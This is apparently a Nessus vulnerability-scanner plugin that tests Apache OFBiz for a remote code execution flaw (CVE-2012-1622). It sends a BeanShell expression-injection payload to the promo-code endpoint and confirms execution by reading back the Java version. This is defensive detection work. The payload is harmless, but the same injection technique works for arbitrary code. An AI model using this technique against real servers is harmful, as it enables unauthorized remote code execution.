#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59247);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/10/13 15:19:33 $");

  script_cve_id("CVE-2012-1622");
  script_bugtraq_id(53025);
  script_osvdb_id(81196);

  script_name(english:"Apache OFBiz FlexibleStringExpander Remote Code Execution");
  script_summary(english:"Attempts to execute Java code");

  script_set_attribute(attribute:"synopsis", value:"The remote web application has a code execution vulnerability.");
  script_set_attribute(
    attribute:"description",
    value:
"The version of Apache OFBiz hosted on the remote host has an arbitrary
code execution vulnerability.  Specially crafted input passed to the
getInstance() method of the FlexibleStringExpander class can result in
the evaluation of nested Java Unified Expression Language expressions. 
A remote, unauthenticated attacker could exploit this to execute
arbitrary code."
  );
  script_set_attribute(attribute:"see_also", value:"http://svn.apache.org/viewvc?view=revision&revision=1309879");
  # http://mail-archives.apache.org/mod_mbox/ofbiz-user/201204.mbox/%3C4F378887-E697-44E7-976C-48B9B7475C4D@apache.org%3E"
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f40a2756");
  script_set_attribute(attribute:"solution", value:"Upgrade to Apache OFBiz 10.04.02 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache OFBiz 10.04.01 RCE (Linux)");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/04/05");  # SVN
  script_set_attribute(attribute:"patch_publication_date", value:"2012/04/15"); # 10.04.02 released
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:open_for_business_project");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("ofbiz_detect.nasl");
  script_require_ports("Services/www", 8443, 8080);
  script_require_keys("www/ofbiz/port");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_kb_item_or_exit('www/ofbiz/port');
ecommerce = get_install_from_kb(appname:'ofbiz_ecommerce', port:port);

# it's possible the ecommerce webapp wasn't detected because
# 1) the "Perform thorough tests" setting wasn't enabled when the detection plugin ran
# 2) it was moved into the root
# 3) the 'powered by' footer (which the detection plugin keys on) was modified/removed
if (isnull(ecommerce))
  dirs = make_list('', '/ecommerce');
else
  dirs = make_list(ecommerce['dir']);

java = 'System.getProperty("java.version")';
script = '${bsh:' + java + '}';
postdata = 'productPromoCodeId=' + script;

foreach dir (dirs)
{
  url = dir + '/control/addpromocode/showcart';
  res = http_send_recv3(
    method:'POST',
    item:url,
    port:port,
    content_type:'application/x-www-form-urlencoded',
    data:postdata,
    exit_on_fail:TRUE
  );

  # if ofbiz was only detected via https, our request may result in a redirect to http
  # which http.inc apparently is not capable of following
  headers = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(headers)) continue;

  if (headers['$code'] == 302)
  {
    match = eregmatch(string:headers['location'], pattern:'^http://[^:/]+(:[0-9]+)?(/.+)$');
    if (isnull(match)) break;
    if (match[2] != url) break;  # if it's not redirecting to the same path we may be looking at something other than ofbiz

    if (isnull(match[1]))
      port = 80;
    else
      port = int(match[1] - ':');

    res = http_send_recv3(
      method:'POST',
      item:url,
      port:port,
      content_type:'application/x-www-form-urlencoded',
      data:postdata,
      exit_on_fail:TRUE
    );
  }

  if ('Nested scripts are not supported' >< res[2])
    audit(AUDIT_WEB_APP_NOT_AFFECTED, 'OFBiz', build_url(qs:dir + '/', port:port));

  match = eregmatch(string:res[2], pattern:'The promotion code &#91;([^&]+)&#93; is not valid.');
  ver = match[1];
  if (!isnull(ver) && ver =~ '^[0-9._]+')
  {
    if (report_verbosity > 0)
    {
      report =
        '\nNessus executed the following Java code :\n\n' +
        java + '\n' +
        '\nby sending the following request :\n\n' +
        crap(data:"-", length:30) + ' snip ' + crap(data:"-", length:30) + '\n' +
        http_last_sent_request() + '\n' +
        crap(data:"-", length:30) + ' snip ' + crap(data:"-", length:30) + '\n' +
        '\nWhich returned the following value :\n\n' +
        ver + '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
    # never reached
  }
}

audit(AUDIT_HOST_NOT, 'affected');
